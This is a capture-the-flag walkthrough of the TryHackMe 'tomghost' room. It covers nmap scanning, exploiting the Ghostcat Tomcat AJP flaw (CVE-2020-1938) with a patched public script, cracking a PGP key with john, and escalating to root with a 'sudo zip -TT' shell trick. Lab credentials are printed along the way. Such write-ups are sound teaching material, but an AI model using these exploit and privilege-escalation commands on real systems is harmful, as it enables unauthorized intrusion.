# tomghost

[tomghost](https://tryhackme.com/room/tomghost)

## Solution

### Initial Enumeration

Usually I begin by running an nmap scan on the ip address of the box.

```console
nmap $IP
```

This will output the open ports. We obtain

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

Now we can try to run some basic scripts and to get the versions of these processes by using

```console
nmap -sS -sV -sC -p22,53,8009,8080 $IP
```

This might require sudo to run (because of `-sS`).

### Apache Tomcat

We can see that the server uses `Apache Tomcat 9.0.30` which is vulnerable to
https://nvd.nist.gov/vuln/detail/CVE-2020-1938. The server also uses `Apache
Jserv (Protocol v1.3)` which is a part of the exploit.

We can use
https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md
to exploit the vulnerability.

However, this script doesn't work and I had to patch it

```console
261c261
< 		self.stream = self.socket.makefile("rb", bufsize=0)
---
> 		self.stream = self.socket.makefile("rb")
301c301
< print("".join([d.data for d in data]))
---
> print(b"".join([d.data for d in data]))
```

(You can copy paste this into `patchfile.patch` and then run `patch
CVE-2020-1938.py patchfile.patch` or get the script from my
[github](https://raw.githubusercontent.com/alexjercan/learning-cybersecurity/master/thm/tomghost/CVE-2020-1938.py)).

Next you can run

```console
python CVE-2020-1938.py $IP -p 8009 -f WEB-INF/web.xml
```

This will output the config of the server and here we can see a username and a
password `skyfuck:8730281lkjlkjdqlksalks`. So we can try to ssh into the machine.

### SkyF**k

Since we have the password for this user we can try to see if we have sudo
privilege using `sudo -l`, but we do not have any access to sudo.

If we look in `/home` we can see that there is another user called `merlin`.

In our own home directory we have two files `credential.pgp` and
`tryhackme.asc`. We can use `scp` or any other method to download them locally
`scp skyfuck@$IP:credential.pgp .`.

We can inspect the two files.

- `credential.pgp`: PGP Elgamal encrypted session key - keyid: 61E104A6 6184FBCC Elgamal Encrypt-Only 1024b.
- `tryhackme.asc`: PGP private key block

We can try to use `john` to crack the `tryhackme.asc` key. (https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html)

```console
gpg2john tryhackme.asc > tryhackme.txt
john tryhackme.txt
```

And we get the key `alexandru`.

Next we can unlock the PGP file. (when you import the file make sure to enter the password in the popup window).

```console
gpg --import tryhackme.asc
gpg -d credential.pgp
```

This gives us the other user credentials `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`.

Next we can ssh into this user and `cat user.txt` to ge the flag.

### Merlin

Again we can try to see what havoc we can cause with `sudo -l`.

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

This means we can run zip as root.

```console
sudo zip user.zip user.txt -T -TT "sh #"
```

The important part of this command is to use -TT which executes a command to
test if the archive is ok. (man zip) (https://gtfobins.github.io/gtfobins/zip/#sudo)

Next we can show the root flag from `/root/root.txt`
